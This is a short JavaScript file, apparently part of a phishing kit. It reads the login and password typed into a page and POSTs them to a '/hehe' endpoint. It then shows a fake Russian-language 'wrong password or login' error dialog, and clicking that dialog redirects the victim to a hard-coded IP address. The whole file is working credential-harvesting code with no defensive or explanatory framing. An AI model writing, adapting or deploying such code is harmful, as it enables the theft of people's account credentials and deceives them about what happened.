let btn = document.querySelector('.button-main');
let login = document.querySelector('.log1');
let pass = document.querySelector('.pas1');
btn.addEventListener('click', () => {
    console.log(login.value)
    console.log(pass.value)
    let a = `${login.value} ${pass.value}`
    fetch('/hehe', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json;charset=utf-8'
        },
        body: JSON.stringify({'log': a})
    })
    let osh = document.createElement('div')
    osh.innerHTML = el
    document.body.insertBefore(osh, document.querySelector('wrapper_inner'))
    document.querySelector('.modal1').addEventListener('click', () => {
        window.location = "http://91.239.68.150/"
    })
})


var el = `
<div class="modal1">
    <div class="modal bootstrap-dialog type-danger fade size-normal in" tabindex="-1" role="dialog" aria-hidden="false"
         id="6ba9f709-d062-44b3-9974-c93900fef57c" aria-labelledby="6ba9f709-d062-44b3-9974-c93900fef57c_title"
         style="display: block;">
        <div class="modal-backdrop fade in" style="height: 642px;"></div>
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="bootstrap-dialog-header">
                        <div class="bootstrap-dialog-close-button" style="display: block;">
                            <button class="close">×</button>
                        </div>
                        <div class="bootstrap-dialog-title" id="6ba9f709-d062-44b3-9974-c93900fef57c_title">Ошибка!
                        </div>
                    </div>
                </div>
                <div class="modal-body">
                    <div class="bootstrap-dialog-body">
                        <div class="bootstrap-dialog-message">Неправильный пароль или логин</div>
                    </div>
                </div>
                <div class="modal-footer">
                    <div class="bootstrap-dialog-footer">
                        <div class="bootstrap-dialog-footer-buttons">
                            <button class="btn btn-default" id="1bbdd94d-7136-4f8f-aa72-88ce409af2c1"><span
                                    class="bootstrap-dialog-button-icon glyphicon glyphicon-ok-sign"></span>Ок
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal-backdrop fade in" style="height: 642px;"></div>
</div>`
